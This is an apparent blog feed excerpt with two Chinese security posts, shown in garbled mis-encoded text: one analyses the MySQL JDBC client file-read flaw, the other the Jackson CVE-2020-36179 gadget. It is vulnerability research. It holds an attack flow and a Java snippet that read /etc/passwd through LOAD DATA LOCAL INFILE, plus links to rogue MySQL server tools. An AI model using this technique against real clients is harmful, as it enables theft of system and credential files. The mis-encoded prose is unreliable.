class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clientï¼šç”³è¯·è·‘ä¸ªsqlï¼Œå†…å®¹æ˜¯&quot;***&quot;ï¼ˆjdbc-mysql-connectoré»˜è®¤è®¤è¯ç™»å½•å®Œæˆä¹‹åï¼Œä¼šæœ‰show variables&#x2F;select å‚æ•°ç­‰è¡Œä¸ºï¼‰</span><br><span class="line">serverï¼šå¥½çš„ï¼Œï¼ˆä¸ç®¡sqlå†…å®¹ï¼‰ï¼Œé‚£ä½ æŠŠ&#x2F;etc&#x2F;passwdæ–‡ä»¶è¯»å–ä¼ è¿‡æ¥å§</span><br><span class="line">clientï¼šå¥½çš„ï¼Œï¼ˆè¯»å–æœ¬åœ°&#x2F;etc&#x2F;passwdï¼‰ï¼Œè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼Œè¯·æŸ¥æ”¶</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="local-infile-amp-allowLoadLocalInfile"><a href="#local-infile-amp-allowLoadLocalInfile" class="headerlink" title="local-infile &amp; allowLoadLocalInfile"></a>local-infile &amp; allowLoadLocalInfile</h3><h4 id="local-infile"><a href="#local-infile" class="headerlink" title="local-infile"></a>local-infile</h4><p>mysql server æœ‰ä¸ªé…ç½®å‚æ•°ï¼Œåœ¨my.cnfä¸­å¯¹åº”çš„æ˜¯</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">local-infile</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åœ¨sqlä¸­é€šè¿‡å…¨å±€å‚æ•°local_infileå®ç°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> local_infile = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p><strong>* ä½†æ˜¯è¿™å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ *</strong></p><p>éœ€è¦å…³æ³¨çš„æ˜¯mysql-clientçš„å‚æ•°ï¼Œå¯ä»¥é€šè¿‡é…ç½®</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">local-infile</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…åœ¨msyqlå‘½ä»¤è¡Œï¼Œæ˜¾å¼åŠ ä¸Š â€“local-infile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql --local-infile 1 -hlocalhost -uroot -ppassword</span><br></pre></td></tr></table></figure><h4 id="allowLoadLocalInfile"><a href="#allowLoadLocalInfile" class="headerlink" title="allowLoadLocalInfile"></a>allowLoadLocalInfile</h4><p>åœ¨jdbc-mysql-connector sdkä¸­ï¼Œæ§åˆ¶clientæ˜¯å¦å¯ä»¥load local fileçš„å°±æ˜¯è¿™ä¸ªå‚æ•°ï¼Œåœ¨5.xå’Œ8.xä¸­é»˜è®¤éƒ½æ˜¯falseï¼ˆå‚è€ƒã€7ã€‘å’Œã€8ã€‘ï¼‰ï¼Œæ‰€ä»¥éœ€è¦åœ¨jdbc urlä¸­é…ç½®allowLoadLocalInfile=true</p><p>åœ¨8.0.22ä¸­è¿˜å¼•å…¥äº†allowLoadLocalInfileInPathï¼Œä¸è¿‡æ²¡ä»€ä¹ˆå½±å“</p><p><img src="/images/pasted-121.png" alt="upload successful"></p><h3 id="max-allowed-packet"><a href="#max-allowed-packet" class="headerlink" title="max_allowed_packet"></a>max_allowed_packet</h3><blockquote><p>å‚è€ƒã€1ã€‘ä¸­æåˆ° jdbc-mysql-connector 5.xç‰ˆæœ¬ä¸­ï¼Œé‡åˆ°max_allowed_packet çš„é—®é¢˜ï¼Œæœ€ç»ˆæ’æŸ¥å‘ç°æ˜¯client sdkä¸­çš„maxAllowedPacketå‚æ•°ï¼Œéœ€è¦serverç«¯ä¸‹å‘é…ç½®ã€‚<br>ä½œè€…é‡‡å–çš„actionæ˜¯å›å¤äº†client çš„show varialbesè¯·æ±‚ï¼Œå¹¶åœ¨å…¶ä¸­è®¾ç½®ç›¸å…³maxAllowedPacketç­‰å‚æ•°ã€‚</p></blockquote><p>å…¶å®åœ¨5.xä¸­ï¼ŒmaxAllowPacket default -1<br><img src="/images/pasted-122.png" alt="upload successful"><br>åœ¨8.*ä¸­ï¼ŒmaxAllowPacket default 65535<br><img src="/images/pasted-123.png" alt="upload successful"></p><p>æ‰€ä»¥è¿™ä¹Ÿæ˜¯jdbc-mysql-connector 5.*ç‰ˆæœ¬ä¸­éœ€è¦æ³¨æ„çš„ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦æ˜¾å¼çš„åœ¨urlä¸­åŠ å…¥å‚æ•°maxAllowedPacket=65535.</p><h3 id="pocæ„é€ æµç¨‹"><a href="#pocæ„é€ æµç¨‹" class="headerlink" title="pocæ„é€ æµç¨‹"></a>pocæ„é€ æµç¨‹</h3><p>å‰æ–‡ load local dataæµç¨‹ä¸­ï¼Œé‡ç‚¹æ˜¯ç¬¬äºŒä¸ªï¼Œä¹Ÿå°±æ˜¯serverçš„å›åŒ…ï¼Œéœ€è¦æŒ‡å®šclientå»è¯»å–ç‰¹å®šæ–‡ä»¶ï¼Œåœ¨ä¸æ˜¯å¾ˆäº†è§£mysqlåè®®æƒ…å†µä¸‹ï¼Œæ”¹æ”¹åŒ…æœ€ç®€å•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 8.*</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">String url = <span class="string">&quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;allowLoadLocalInfile=true&amp;maxAllowedPacket=65535&quot;</span>;</span><br><span class="line">Connection conn = DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;load data local infile \&quot;/etc/passwd\&quot; into table test FIELDS TERMINATED BY &#x27;\\n&#x27;;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-124.png" alt="upload successful"></p><p>server çš„æ•´ä¸ªæ”»å‡»æ­¥éª¤å¦‚ä¸‹:</p><ol><li>å›å¤mysql clientä¸€ä¸ªgreetingåŒ…</li><li>ç­‰å¾…clientç«¯å‘é€ä¸€ä¸ªæŸ¥è¯¢åŒ…</li><li>å›å¤ä¸€ä¸ªfile transferåŒ…</li></ol><p>è¿™é‡Œç›´æ¥ç»™é€šç”¨çš„åˆ©ç”¨å·¥å…·</p><ol><li><p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a></p><p> æœ€æ—©çš„åˆ©ç”¨å·¥å…·ï¼Œä¸‰ä¸ªæ­¥éª¤ï¼Œé€šè¿‡mysqlç»„åŒ…å®ç°ã€‚ä½†æ˜¯æ²¡å¤ç°æˆåŠŸâ€¦ä¼°è®¡æ˜¯mysqlåè®®é‚£é‡Œç»„åŒ…æœ‰é—®é¢˜ï¼Œå·æ‡’ä¸è¯¦ç»†åˆ†æäº†</p></li><li><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p> fnmsdçš„ï¼Œè¦å¤šçœ‹ä»–å†™çš„æ–‡æ¡£ï¼Œé€šè¿‡usernameæŒ‡å®šè¯»å–çš„æ–‡ä»¶</p></li><li><p><a href="https://github.com/yang8e/jdbc_mysql_redfile">https://github.com/yang8e/jdbc_mysql_redfile</a></p><p> yang8eçš„ï¼Œç›´æ¥å‘åŒ…ï¼Œæ²¡å…³æ³¨mysqlåè®®ç»†èŠ‚ï¼Œç²—æš´ä½†æ˜¯ä¹Ÿç®€å•ã€‚å½“æ—¶ä¹Ÿè¸©äº†ä»–è¿™ä¸ªå‘ï¼Œä¸è¿‡æœ‰æ›´é€šç”¨çš„jdbc poc urlã€‚</p></li></ol><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬ä»¥ä¸ºä¸€ç¯‡æ–‡ç« å¯ä»¥æå®šï¼Œç»“æœè¡Œæ–‡è¿˜æ˜¯è¿‡é•¿ï¼Œååºåˆ—åŒ–çš„ä¸‹ç¯‡å†åšç ”ç©¶å§ã€‚</p><p>ç®€å•æ€»ç»“ä¸‹ï¼Œæœ¬æ–‡ç ”ç©¶äº†jdbc-mysql-connectorçš„mysql clientä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç»“è®ºæ˜¯æ— è®ºæ˜¯5.*ã€8.*éƒ½å—å½±å“ã€‚æœŸé—´è¸©äº†jdbc 5.*ç‰ˆæœ¬maxAllowedPacketçš„å‘ï¼Œå‘ç°äº†yang8eçš„è§£å†³æ–¹æ¡ˆï¼Œå¹¶æå‡ºæ›´é€šç”¨çš„pocã€‚</p><p>æŠ›å‡ºä¸ªé—®é¢˜:</p><ol><li>å¦‚ä½•ç¦ç”¨jdbc clientçš„load local fileåŠŸèƒ½ï¼Ÿé˜‰å‰²sdkï¼Ÿè¿˜æ˜¯allowLoadLocalInfile=false</li><li>ç›®å‰çš„pocåªèƒ½è¯»å–ä¸€ä¸ªæ–‡ä»¶clientå°±ä¼šæŠ›å¼‚å¸¸ï¼Œæœ‰åŠæ³•å¯ä»¥æŒç»­è¯»å–å¤šä¸ªæ–‡ä»¶å—ï¼Ÿ</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.freebuf.com/articles/web/251626.html">JDBC MySQLä»»æ„æ–‡ä»¶è¯»å–ä¸­çš„ä¸€äº›å‘ï¼ˆyangxiaocheng ï¼‰</a></li><li>[2] <a href="https://www.anquanke.com/post/id/203086">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´åˆ†æï¼ˆfnmsd@360ï¼‰</a></li><li>[3] <a href="https://paper.seebug.org/1227/">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´ï¼ˆå››å“¥ï¼‰</a></li><li>[4] <a href="https://xz.aliyun.com/t/9250">MySQL JDBC ååºåˆ—åŒ–åˆ†æï¼ˆ7tem7ï¼‰</a></li><li>[5] <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">ã€ŠNew Exploit Technique In Java Deserialization Attackã€‹(zhangyang &amp; keyiå¤§ä½¬)</a></li><li>[6] <a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»é“¾æ‹“å±•</a></li><li>[7] <a href="https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-connp-props-security.html">https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-connp-props-security.html</a></li><li>[8] <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html">https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html</a></li><li>[9] <a href="http://scz.617.cn:8/network/202001101612.txt">æ¶æ„MySQL Serverè¯»å–MySQL Clientç«¯æ–‡ä»¶ï¼ˆå››å“¥ï¼‰</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¹‹å‰Getäº†h2 initsqlçš„éªšå§¿åŠ¿ï¼Œäºæ˜¯æƒ³æ€»ç»“æ€»ç»“jdbc urlå¯æ§æƒ…å†µä¸‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œç»å…¸çš„åœºæ™¯å°±æ˜¯jdbc mysql æ–‡ä»¶è¯»å–å’Œååºåˆ—åŒ–ï¼Œæ­£å¥½å‰ä¸ä¹…çš„Druid CVE-2021-26919çš„ç”¨çš„å°±æ˜¯jdbc mysqlååºåˆ—åŒ–æ¼æ´ï¼Œå­¦ä¹ å­¦ä¹ ï¼Œå±…ç„¶è¸©ä¸€äº›å‘ï¼Œå•ç‹¬è®°å½•ä¸‹æ¥ã€‚&lt;/p&gt;
&lt;p&gt;mysql clientä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å†å²æ‚ ä¹…ï¼Œå‚è€ƒã€6ã€‘ä¸­æœ‰æåˆ°æ—©åœ¨13å¹´å°±æœ‰æå‡ºï¼Œä½†æ˜¯ä½œä¸ºmysql æ­£å¸¸åŠŸèƒ½ä¸€ç›´ä¿ç•™ã€‚ç›´åˆ°19å¹´blackhat å¼ æ¨å’Œå¯å¥• å¤§ä½¬å‘ç°ååºåˆ—åŒ–çš„åˆ©ç”¨åœºæ™¯ï¼ˆå‚è€ƒã€5ã€‘ï¼‰ï¼Œç›¸å…³ç ”ç©¶è¾¾åˆ°å°é«˜æ½®ï¼Œä¸è¿‡å¤šèµ˜è¿°ã€‚&lt;/p&gt;
&lt;h2 id=&quot;MySQL-Clientæ–‡ä»¶è¯»å–æ¼æ´&quot;&gt;&lt;a href=&quot;#MySQL-Clientæ–‡ä»¶è¯»å–æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;MySQL Clientæ–‡ä»¶è¯»å–æ¼æ´&quot;&gt;&lt;/a&gt;MySQL Clientæ–‡ä»¶è¯»å–æ¼æ´&lt;/h2&gt;&lt;h3 id=&quot;åŸç†ï¼šload-local-data&quot;&gt;&lt;a href=&quot;#åŸç†ï¼šload-local-data&quot; class=&quot;headerlink&quot; title=&quot;åŸç†ï¼šload local data&quot;&gt;&lt;/a&gt;åŸç†ï¼šload local data&lt;/h3&gt;&lt;p&gt;æ­£å¸¸çš„load local dataæµç¨‹&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;clientï¼šç”³è¯·è·‘ä¸ªsqlï¼Œå†…å®¹æ˜¯&amp;quot;load data local infile &amp;quot;&amp;#x2F;etc&amp;#x2F;passwd&amp;quot; into table test FIELDS TERMINATED BY &amp;#39;\n&amp;#39;;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;serverï¼šå¥½çš„ï¼Œï¼ˆè¯†åˆ«sqlå†…å®¹ï¼‰ï¼Œé‚£ä½ æŠŠ&amp;#x2F;etc&amp;#x2F;passwdæ–‡ä»¶è¯»å–ä¼ è¿‡æ¥å§&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clientï¼šå¥½çš„ï¼Œï¼ˆè¯»å–æœ¬åœ°&amp;#x2F;etc&amp;#x2F;passwdï¼‰ï¼Œè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼Œè¯·æŸ¥æ”¶&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æ”»å‡»æµç¨‹&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;clientï¼šç”³è¯·è·‘ä¸ªsqlï¼Œå†…å®¹æ˜¯&amp;quot;***&amp;quot;ï¼ˆjdbc-mysql-connectoré»˜è®¤è®¤è¯ç™»å½•å®Œæˆä¹‹åï¼Œä¼šæœ‰show variables&amp;#x2F;select å‚æ•°ç­‰è¡Œä¸ºï¼‰&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;serverï¼šå¥½çš„ï¼Œï¼ˆä¸ç®¡sqlå†…å®¹ï¼‰ï¼Œé‚£ä½ æŠŠ&amp;#x2F;etc&amp;#x2F;passwdæ–‡ä»¶è¯»å–ä¼ è¿‡æ¥å§&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clientï¼šå¥½çš„ï¼Œï¼ˆè¯»å–æœ¬åœ°&amp;#x2F;etc&amp;#x2F;passwdï¼‰ï¼Œè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼Œè¯·æŸ¥æ”¶&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
    <category term="MySQL" scheme="http://m0d9.me/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>JackSon DriverAdapterCPDS gadget CVE-2020-36179åˆ†æ</title>
    <link href="http://m0d9.me/2021/04/09/JackSon-CVE-2020-36179%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/04/09/JackSon-CVE-2020-36179%E5%88%86%E6%9E%90/</id>
    <published>2021-04-09T04:30:00.000Z</published>
    <updated>2021-04-19T07:25:35.513Z</updated>
    
    <content type="html"><![CDATA[<p>Day1å‘ç°æœ‰åˆ†æ jackson çš„DriverAdapterCPDS è¿™ä¸ªgadget</p><h2 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h2><p>å…¶å®æ˜¯å‚è€ƒã€1ã€‘å¤§ä½¬ä¸ŠæŠ¥çš„CVE-2020-36179</p><p>Gadget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DriverAdapterCPDS</span><br><span class="line">    -&gt;seturl</span><br><span class="line">        -&gt;getPooledConnection</span><br><span class="line">            -&gt;DirverManager.getConnection(this.url,username,pass)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>gadgetæµç¨‹å¾ˆç®€å•ï¼Œä½†æ˜¯åœ¨å¤ç°çš„æ—¶å€™å‘ç°å¡åœ¨getParentLoggerè¿™é‡Œï¼Œä¸ä¼šæ‰§è¡Œåˆ°getPooledConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SQLFeatureNotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§getParentLoggerç®€å•ç²—æš´ç›´æ¥throw Exceptionï¼Œç›´æ¥GG</p><p>å¤šæ¬¡æµ‹è¯•å‘ç°getParentLoggerï¼ŒgetPooledConnectionæ‰§è¡Œé¡ºåºå¹¶ä¸æ˜¯æœ‰åºçš„ï¼Œå¦‚ä¸‹ï¼š</p><p>å¤±è´¥<br><img src="/images/pasted-120.png" alt="upload successful"></p><p>æˆåŠŸ<br><img src="/images/pasted-119.png" alt="upload successful"></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>èƒŒæ™¯çŸ¥è¯†ï¼šjacksonååºåˆ—åŒ–ä¼šæ‰§è¡Œéƒ¨åˆ†getter</p><p>getterçš„äº§ç”Ÿæµç¨‹è·Ÿè¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">_addMemberMethods:110, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collect:42, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collectMethods:33, AnnotatedMethodCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_methods:365, AnnotatedClass (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">memberMethods:305, AnnotatedClass (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_addMethods:525, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">collectAll:309, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getPropertyMap:287, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getProperties:170, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_properties:164, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findProperties:239, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">_findCreatorsFromProperties:361, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_constructDefaultValueInstantiator:345, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findValueInstantiator:269, BasicDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">buildBeanDeserializer:214, BeanDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">createBeanDeserializer:137, BeanDeserializerFactory (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createDeserializer2:411, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createDeserializer:349, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createAndCache2:264, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_createAndCacheValueDeserializer:244, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findValueDeserializer:142, DeserializerCache (com.fasterxml.jackson.databind.deser)</span><br><span class="line">findContextualValueDeserializer:444, DeserializationContext (com.fasterxml.jackson.databind)</span><br><span class="line">_findDeserializer:194, TypeDeserializerBase (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">_deserialize:97, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:71, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:712, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:68, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:4014, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:3005, ObjectMapper (com.fasterxml.jackson.databind)</span><br></pre></td></tr></table></figure><blockquote><p>æœ€ç»ˆè§‚å¯Ÿå‘ç°jacksoné€šè¿‡ ClassUtil.getClassMethods(cls)è·å–æ‰€æœ‰çš„å‡½æ•°ï¼Œæœ€ç»ˆè°ƒç”¨çš„æ˜¯getDeclaredMethods()ï¼Œè€ŒgetDeclaredMethods()è¿”å›æ•°ç»„ä¸­çš„å…ƒç´ æ²¡æœ‰æ’åºï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•ç‰¹å®šçš„é¡ºåºï¼Œä»è€Œå¯¼è‡´éšæœºè§¦å‘ã€‚</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ç®€å•è·Ÿè¸ªåˆ†æäº†CVE-2020-36179 è¿™ä¸ªé“¾ï¼Œå‘ç°2å¤„æœ‰æ„æ€çš„ç‚¹</p><ol><li>jdbc url å¯æ§æƒ…å†µä¸‹ï¼Œåˆ©ç”¨H2 sqlå¯æ”»å‡»h2 serverï¼ˆï¼‰</li><li>getDeclaredMethods éšæœºç‰¹æ€§</li></ol><p>æ‹“å±•æ€è€ƒ</p><ol><li>jdbc urlå¯æ§æ˜¯ä¸ªé€šç”¨é—®é¢˜</li><li>getDeclaredMethods éšæœºç‰¹æ€§æœ‰ç»•è¿‡æ–¹æ³•å—ï¼Ÿ</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://github.com/Al1ex/CVE-2020-36179">Al1ex/CVE-2020-36179</a></li><li>[2] <a href="http://www.h2database.com/html/features.html#execute_sql_on_connection">H2 feature</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Day1å‘ç°æœ‰åˆ†æ jackson çš„DriverAdapterCPDS è¿™ä¸ªgadget&lt;/p&gt;
&lt;h2 id=&quot;èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;/a&gt;èƒŒæ™¯çŸ¥è¯†&lt;/h2&gt;&lt;p&gt;å…¶å®æ˜¯å‚è€ƒã€1ã€‘å¤§ä½¬ä¸ŠæŠ¥çš„CVE-2020-36179&lt;/p&gt;
&lt;p&gt;Gadget:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;DriverAdapterCPDS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -&amp;gt;seturl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        -&amp;gt;getPooledConnection&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            -&amp;gt;DirverManager.getConnection(this.url,username,pass)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Jackson" scheme="http://m0d9.me/tags/Jackson/"/>
    
    <category term="Gadget" scheme="http://m0d9.me/tags/Gadget/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-25646 æ¼æ´åˆ†æ</title>
    <link href="http://m0d9.me/2021/02/19/Apache-Druid-CVE-2021-25646-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/02/19/Apache-Druid-CVE-2021-25646-%E5%88%86%E6%9E%90/</id>
    <published>2021-02-19T03:16:00.000Z</published>
    <updated>2021-04-24T05:56:58.714Z</updated>
    
